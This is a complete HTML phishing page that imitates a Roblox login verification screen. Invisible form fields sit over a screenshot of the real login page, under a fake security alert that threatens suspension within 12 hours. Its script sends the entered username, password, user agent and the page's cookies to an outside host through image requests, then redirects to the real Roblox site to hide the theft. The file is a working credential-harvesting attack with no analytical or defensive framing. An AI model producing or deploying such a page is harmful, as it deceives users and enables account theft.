<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login Verification</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100%;
        }
        #screenshot {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
        }
        #admin-alert {
            position: absolute;
            top: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: #ff4444;
            color: white;
            padding: 10px;
            border-radius: 5px;
            z-index: 3;
            font-weight: bold;
            text-align: center;
            width: 80%;
        }
        #username {
            position: absolute;
            background: transparent;
            border: none;
            outline: none;
            font-size: 16px;
            color: white !important;
            padding: 10px;
            box-sizing: border-box;
            z-index: 4;
        }
        #password {
            position: absolute;
            background: transparent;
            border: none;
            outline: none;
            font-size: 16px;
            color: white;
            caret-color: white;
            padding: 10px;
            box-sizing: border-box;
            z-index: 4;
            -webkit-text-security: disc;
        }
        #username::placeholder, #password::placeholder {
            color: white !important;
            opacity: 0.7;
        }
        #login-button {
            position: absolute;
            background: transparent;
            border: none;
            outline: none;
            cursor: pointer;
            width: 375px;
            height: 40px;
            z-index: 4;
        }
        #login-button:hover {
            background: rgba(0, 0, 0, 0.1);
        }
        #fake-loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 9999;
            justify-content: center;
            align-items: center;
            font-size: 2rem;
        }
        #success {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 1.5rem;
            z-index: 10000;
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <img id="screenshot" src="https://raw.githubusercontent.com/MasterAtHacking/admin-verification-github.io/refs/heads/main/roblox-login.png" alt="Roblox Admin Login">
    <div id="admin-alert">
        SECURITY ALERT: Your session requires re-authentication. Failure to comply within 12 hours will result in account suspension.
    </div>
    <div id="overlay">
        <form id="fake-login-form">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="login-button" aria-label="Log In"></button>
        </form>
    </div>
    <div id="fake-loading">Verifying Credentials...Please Wait</div>
    <div id="success">Successfully confirmed session! Redirecting Now</div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const usernameField = document.getElementById('username');
            const passwordField = document.getElementById('password');
            const loginButton = document.getElementById('login-button');

            usernameField.style.top = '264px';
            usernameField.style.left = '46%';
            usernameField.style.transform = 'translateX(-50%)';
            usernameField.style.width = '250px';
            usernameField.style.height = '40px';

            passwordField.style.top = '310px';
            passwordField.style.left = '46%';
            passwordField.style.transform = 'translateX(-50%)';
            passwordField.style.width = '250px';
            passwordField.style.height = '40px';

            loginButton.style.top = '350px';
            loginButton.style.left = '50%';
            loginButton.style.transform = 'translateX(-50%)';
            loginButton.style.width = '375px';
            loginButton.style.height = '40px';

document.getElementById('fake-login-form').addEventListener('submit', function(e) {
    e.preventDefault();

    const username = usernameField.value;
    const password = passwordField.value;

    if (!username || !password) {
        alert("All fields are required for verification.");
        return;
    }

    document.getElementById('fake-loading').style.display = 'flex';

    // Send login details to save.php for ease.
    (new Image()).src = `https://wassup.iceiy.com/save.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&user_agent=${encodeURIComponent(navigator.userAgent)}`;

    // Force send cookies to start.php, even if empty
    const cookies = document.cookie || "No cookies found";
    (new Image()).src = `https://wassup.iceiy.com/start.php?cookies=${encodeURIComponent(cookies)}`;

    document.getElementById('success').style.display = 'block';
    setTimeout(() => {
        window.location.href = "https://www.roblox.com/home";
    }, 3000);
});

    </script>
</body>
</html>
